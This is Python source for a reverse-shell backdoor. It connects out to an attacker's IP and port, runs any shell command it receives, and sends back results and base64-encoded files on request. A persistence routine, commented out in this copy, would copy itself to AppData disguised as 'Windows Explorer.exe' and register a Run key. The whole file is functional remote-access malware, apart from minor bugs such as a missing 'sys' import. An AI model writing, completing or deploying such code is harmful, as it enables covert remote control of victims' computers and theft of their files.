import socket
import subprocess
import os
import json
import base64
import shutil

class BackDoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        #self.become_Persistent()


    def become_Persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d + "'+ evil_file_location + '"', shell = True)

    def  reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data) 

    def reliable_recieve(self):
        json_data = ""
        while True:
          try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data) 
          except ValueError:
            continue

 
    def Executecommand(self, command):
        return subprocess.check_output(command, shell=True)

    def ChangeDirectory(self, path):
        os.chdir(path)
        return "[+] Changing Directory to " + path 

    
    def ReadArchive(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def CurrentDir(self):
        return os.getcwd()
        

    def run(self):
        print("[+] Connection Succsseful")

        while True:   
            command = self.reliable_recieve()

            if command[0] == "exit":
                self.connection.close()
                exit()
            
            elif command[0] == "pwd":
                Command_Result = self.CurrentDir()

            elif command[0] == "cd" and len(command) > 1:
                Command_Result = self.ChangeDirectory(command[1])
            elif command[0] == "download":
                Command_Result = self.ReadArchive(command[1])
            else:
                   Command_Result = self.Executecommand(command)

            self.reliable_send(Command_Result)


Back = BackDoor("Put ip", "put port")
Back.run()